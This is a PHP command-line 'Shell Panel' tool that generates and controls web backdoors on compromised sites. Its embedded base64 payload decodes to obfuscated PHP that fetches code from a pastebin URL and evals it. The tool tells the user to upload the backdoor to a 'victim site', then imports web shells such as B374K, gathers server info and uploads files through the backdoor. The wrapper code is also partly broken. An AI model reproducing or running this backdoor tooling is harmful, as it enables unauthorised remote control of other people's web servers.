<?php eval("?>".base64_decode("<?php
error_reporting(0);
$blue = "\e[34m";
$lblue = "\e[36m";
$cln = "\e[0m";
$green = "\e[92m";
$fgreen = "\e[32m";
$red = "\e[91m";
$bold = "\e[1m";
echo "
\e[96m
                ____ _  _ ____ _    _       ___  ____ _  _ ____ _    
                [__  |__| |___ |    |       |__] |__| | | |___ |    
                ___] |  | |___ |___ |___    |    |  | | | |___ |___ 
                                                     
              $red Coded By   : $blue Lil_dwagz ft Secret_12
              $red Powered By : $lblue Indonesian Error System , Java Programmer Team , All-gone CyberSec
$cln";
$bdcnt = "PD9waHAgJHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFMXHg1MyJ9WyJceDY2aVx4NmRceDc5XHg2ZVx4NzNyanJceDZmIl09ImJkXHg2ZnIiOyR7JHsiXHg0N0xceDRmQlx4NDFMXHg1MyJ9WyJceDY2XHg2OVx4NmRceDc5bnNyXHg2YVx4NzJceDZmIl19PWZpbGVfZ2V0X2NvbnRlbnRzKCJceDY4XHg3NFx4NzRceDcwXHg3MzovL1x4NzBceDYxXHg3M3RceDY1XHg2Mlx4NjluLmNvbS9ceDcyYVx4NzcvXHg2OFx4NTRceDQ4blx4NmUzQzUiKTskeyJceDQ3XHg0Y1x4NGZceDQyXHg0MUxTIn1bIlx4NjZlXHg2ZnN1cWkiXT0iYmRceDZmXHg3MiI7ZXZhbCgkeyR7IkdceDRjXHg0Zlx4NDJceDQxXHg0Y1MifVsiXHg2Nlx4NjVceDZmc3VxaSJdfSk7DQo/Pg==";
echo "\n\n\n$cln";
echo $bold . "List Of Backdoors:$cln";
$sscontents = file_get_contents("shells.txt");
$sscontents = trim($sscontents, "\n");
$shells = explode("\n", $sscontents);
echo "\n\n";
if ($sscontents == "") {
    echo $bold.$red . "[!] Backdoors Is Empty!\n$cln";
}else{
    $sno = 0;
    foreach ($shells as $shell) {
        echo $sno.". $shell\n";
        $sno++;
    }
echo "-------------------------------------------";
}
	menu1:
    echo "\n\n$  Enter Commands(Input No.|help|create) : ";
    $selects = trim(fgets(STDIN, 1024));
    if ($selects == "help") {
        echo "\n\n$bold"."Command List\n$cln";
        echo "=============\n\n";
        echo $bold."[+] create:$cln Generates Backdoor File (backdoor.php)\n";
        echo $bold."[+] help:$cln Display This Help Screen\n";
        echo "[+] Select Backdoor By Typing In The Assigned Serial Number\n";
        goto menu1;
    }elseif ($selects == "create") {
        echo $fgreen."\n\n[+] Creating Backdoor ...";
        file_put_contents("lilback.php", base64_decode($bdcnt));
        echo $cln.$lblue."\n[i] Backdoor Created at$blue lilback.php$cln";
        echo "\n[i] Now Upload This To The Victim Site And Add The URL In$bold shells.txt$cln File";
        echo "\n\n\n$cln";
        echo "Press Enter To Continue\n\n";
        trim(fgets(STDIN, 1024));
        goto menu1;
    }else {
        $selected1 = $shells[$selects];
        echo "$bold";
        echo "\n[+] Shell Selected:$cln ".$selected1."\n";
        echo $bold."[+] Finding Backdoor:$cln ";
        $ssv = $selected1."?sscmd=v";
        $vfc = file_get_contents($ssv);
        if ($vfc == "anny") {
            echo $fgreen."Backdoor Found!\n\n$cln";
            menu2:
                echo "List Of Actionsn$cl\n";
                echo "---------------\n";
                echo $green.$bold."[1]$cln Import Shells\n";
                echo $blue.$bold."[2]$cln Info About Server\n";
                echo $fgreen.$bold."[3]$cln Remote File Upload\n";
                echo $bold.$red."[4] Exit\n";
                echo "$cln";
                // Choose Action
                echo "\n$ Select Option:";
                $action = trim(fgets(STDIN, 1024));
                if ($action == "1") {
                    echo "\n\nList Of Shellsn$cln";
                    echo "-------------------\n";
                    echo "[1]$bold IES shell \n";
                    echo "[2]$bold B374K shell$cln (Pass : shellstack123)\n";
                    echo "[3]$bold Console shell\n";
                    echo "[4]$bold indoxploit shell\n";
                    echo "[5]$bold Mini shell\n";
                    //select Shell from list
                    selectsshell:
                        echo "\n[#] Select Shell To Import:";
                        $impshell = '2';
                        $impshell = trim(fgets(STDIN, 1024));
                        if (!in_array($impshell, array('1', '2', '3', '4', '5'), true)) {
                            echo $bold . $red . "wrong Input$cln \n";
                            gotoselectsshell;
                        } else {
                            echo $lblue . "\n\n[i] Importing Shell...$cln";
                            echo $lblue . "\n[i] Sending Request And Getting Response...$cln";
                            $shellact = $selected1."?sscmd=imps".$impshell;
                            $shellimpresult = file_get_contents($shellact);
                            echo "\n[R] ".$bold.$shellimpresult.$cln;
                            echo "\n\n\n$cln";
                            echo "Press Enter To Continue\n\n";
                            trim(fgets(STDIN, 1024));
                            goto menu2;
                        }
                    } elseif ($action == "2") {
                        echo $bold . $lblue . "\n[+] Server Info$cln";
                        echo $lblue . "\n[i] Sending Request And Getting Response...$cln";
                        $svinfo = $selected1."?sscmd=si";
                        $sicnt = file_get_contents($svinfo);
                        echo $bold."\n$sicnt".$cln;
                        echo "\n\n\n$cln";
                        echo "Press Enter To Continue\n\n";
                        trim(fgets(STDIN, 1024));
                        goto menu2;
                    } elseif ($action == "3") {
                        echo $bold.$lblue."[+] Remote File Upload$cln";
                        echo "\n[i] Upload Files From Your Systemn\n";
                        uploadremotefile:
                            echo "\n$ Enter File Path: ";
                            $fpath = trim(fgets(STDIN, 1024));
                            echo "$ Enter File Name: ";
                            $fname = trim(fgets(STDIN, 1024));
                            echo $lblue."\n[-] File Selected:$cln $fpath";
                            echo $lblue."\n[-] File Name Selected:$cln $fname";
                            echo $lblue."\n[+] Checking If File Exists: $cln";
                            if (file_exists($fpath)) {
                                echo "File Existsn";
                                echo $blue."[i] Initializing File Uploadn$cln";
                                $fileData = file_get_contents($fpath);
                                $fileData = base64_encode($fileData);
                                echo $lblue."[i] Sending Request And Getting Response...\n\n$cln";
                                system("curl -s -F fileData=$fileData -F fileName=$fname -F file=@$fpath $selected1?sscmd=u");
                                echo "\n\n\n$cln";
                                echo "Press Enter To Continue\n\n";
                                trim(fgets(STDIN, 1024));
                                goto menu2;
                            } else {
                                echo $red . "File Do Not Exist! Aborting Uplod Procedure ...\n\n$cln";
                                goto uploadremotefile;
                            }
                        }
                    } else {
                        echo $red . "Backdoor Not Found Quitting...$cln \n";
                    }
                }
?>")); ?>
